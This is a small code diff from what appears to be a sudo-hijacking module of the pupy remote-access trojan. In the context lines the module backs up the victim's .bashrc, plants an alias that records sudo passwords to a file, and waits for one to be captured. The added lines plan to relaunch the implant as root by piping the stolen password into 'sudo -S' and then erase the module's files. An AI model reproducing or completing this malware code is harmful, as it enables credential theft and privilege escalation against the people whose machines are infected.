@@ -123,6 +123,10 @@ fi
         if os.path.exists(self.bashrc):
             self.original_bashrc_content = open(self.bashrc).read()
         
+        # TO DO
+        # launch pupy as root
+        # replace # [OPTIONAL_LINE] by echo "$password" | sudo -S <path_to_pupy_binary>
+
         # write code to the tmp directory
         code = self.sudo_alias_code().replace('[STORE_PASSWORD]', self.password_file)
         open(self.alias_file, 'w').write(code)
@@ -143,3 +147,6 @@ fi
                 self.store_sudo_password(password)
                 self.stopped = True
             time.sleep(5)
+
+        # clean everything
+        self.clean_files()
